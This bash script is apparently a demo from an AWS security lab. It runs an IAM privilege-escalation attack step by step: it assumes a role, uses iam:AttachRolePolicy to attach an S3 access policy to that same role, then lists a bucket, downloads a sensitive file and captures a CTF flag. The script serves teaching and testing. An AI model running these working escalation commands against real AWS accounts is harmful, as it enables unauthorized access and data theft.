#!/bin/bash

# Demo script for iam:AttachRolePolicy privilege escalation to S3 bucket
# This is a ROLE-BASED self-escalation scenario


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-iam-009-to-bucket-starting-user"
STARTING_ROLE="pl-prod-iam-009-to-bucket-starting-role"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM AttachRolePolicy Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "${YELLOW}Role-Based Self-Escalation to S3 Bucket${NC}\n"

# Step 1: Get credentials from Terraform output
echo -e "${YELLOW}Step 1: Getting starting user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_self_escalation_to_bucket_iam_009_iam_attachrolepolicy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials and ARNs
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
STARTING_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.starting_role_arn')
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')
BUCKET_ACCESS_POLICY_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_access_policy_arn')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo -e "${GREEN}✓ Retrieved credentials for $STARTING_USER${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# [EXPLOIT] Step 2: Verify identity as user
echo -e "${YELLOW}Step 2: Verifying identity${NC}"
use_starting_creds
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_IDENTITY"

if [[ ! $CURRENT_IDENTITY == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as expected user${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as $STARTING_USER${NC}\n"

# [EXPLOIT] Step 3: Assume the starting role
echo -e "${YELLOW}Step 3: Assuming starting role${NC}"
echo "Role ARN: $STARTING_ROLE_ARN"

show_cmd "Attacker" "aws sts assume-role --role-arn \"$STARTING_ROLE_ARN\" --role-session-name \"arp-demo-session\""
ASSUME_ROLE_OUTPUT=$(aws sts assume-role \
    --role-arn "$STARTING_ROLE_ARN" \
    --role-session-name "arp-demo-session")

# Update credentials to use assumed role
export AWS_ACCESS_KEY_ID=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo "$ASSUME_ROLE_OUTPUT" | jq -r '.Credentials.SessionToken')

echo -e "${GREEN}✓ Successfully assumed role $STARTING_ROLE${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have S3 bucket access yet
echo -e "${YELLOW}Step 4: Verifying we don't have S3 bucket access yet${NC}"
echo "Attempting to list S3 bucket contents (should fail)..."
show_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
if aws s3 ls s3://$BUCKET_NAME/ &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot access bucket yet${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Perform privilege escalation via AttachRolePolicy
echo -e "${YELLOW}Step 5: Escalating privileges via iam:AttachRolePolicy${NC}"
echo "Attaching S3 bucket access policy to self..."
echo "Policy ARN: $BUCKET_ACCESS_POLICY_ARN"

show_attack_cmd "Attacker" "aws iam attach-role-policy --role-name \"$STARTING_ROLE\" --policy-arn \"$BUCKET_ACCESS_POLICY_ARN\""
aws iam attach-role-policy \
    --role-name "$STARTING_ROLE" \
    --policy-arn "$BUCKET_ACCESS_POLICY_ARN"

echo -e "${GREEN}✓ Successfully attached S3 access policy to self!${NC}\n"

# Wait for policy to propagate
echo -e "${YELLOW}Waiting 15 seconds for policy changes to propagate...${NC}"
sleep 15
echo ""

# [EXPLOIT] Step 6: Verify S3 bucket access using the escalated role session
echo -e "${YELLOW}Step 6: Verifying S3 bucket access${NC}"
echo "Target bucket: $BUCKET_NAME"
echo "Listing bucket contents..."
show_attack_cmd "Attacker" "aws s3 ls s3://$BUCKET_NAME/"
aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents!${NC}\n"

# [EXPLOIT] Step 7: Download sensitive data using the escalated role session
echo -e "${YELLOW}Step 7: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/iam-009-sensitive-data.txt"
show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE"
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# [EXPLOIT] Step 8: Read CTF flag from the bucket
echo -e "${YELLOW}Step 8: Capturing CTF flag${NC}"
show_attack_cmd "Attacker" "aws s3 cp s3://$BUCKET_NAME/flag.txt -"
FLAG_VALUE=$(aws s3 cp s3://$BUCKET_NAME/flag.txt -)
echo -e "${GREEN}FLAG: $FLAG_VALUE${NC}"
echo ""

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$STARTING_USER${NC}"
echo -e "Step 1: Assumed role ${YELLOW}$STARTING_ROLE${NC}"
echo -e "Step 2: Used ${YELLOW}iam:AttachRolePolicy${NC} to attach S3 access policy to self"
echo -e "Step 3: Accessed ${YELLOW}$BUCKET_NAME${NC}"
echo -e "Step 4: Read ${YELLOW}flag.txt${NC} from the target bucket"
echo -e "Result: ${GREEN}S3 Bucket Access${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (AssumeRole) → $STARTING_ROLE → (AttachRolePolicy on self) → S3 Bucket → flag.txt (CTF flag)"
echo ""
echo -e "${YELLOW}CTF Flag:${NC} ${GREEN}$FLAG_VALUE${NC}"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo ""
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to detach the escalated policy${NC}"
echo ""

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
